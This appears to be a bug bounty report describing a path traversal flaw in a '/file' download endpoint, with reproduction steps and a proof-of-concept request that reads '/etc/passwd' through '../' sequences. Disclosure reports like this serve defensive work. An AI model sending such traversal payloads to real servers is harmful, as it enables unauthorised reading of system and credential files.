title: Path Traversal in File Download Endpoint Allows Reading System Files
vulnerability_information:
## Summary
The file download endpoint at `/file` is vulnerable to path traversal. The `name` parameter is used directly in a file path without sanitization, allowing an attacker to read arbitrary files from the server filesystem.

## Steps to Reproduce
1. Access the normal file endpoint:
   ```
   GET /file?name=readme.txt HTTP/1.1
   Host: target.com
   ```
   This returns the readme file normally.

2. Use path traversal to read /etc/passwd:
   ```
   GET /file?name=../../../../etc/passwd HTTP/1.1
   Host: target.com
   ```
3. The server returns the contents of /etc/passwd

## Proof of Concept
```http
GET /file?name=../../../../etc/passwd HTTP/1.1
Host: target.com
```

The server responds with the contents of `/etc/passwd`, confirming arbitrary file read.

## Impact
- Read any file accessible to the web server process
- Access to /etc/passwd reveals system users
- Access to configuration files could expose database credentials
- Potential to read application source code and discover further vulnerabilities
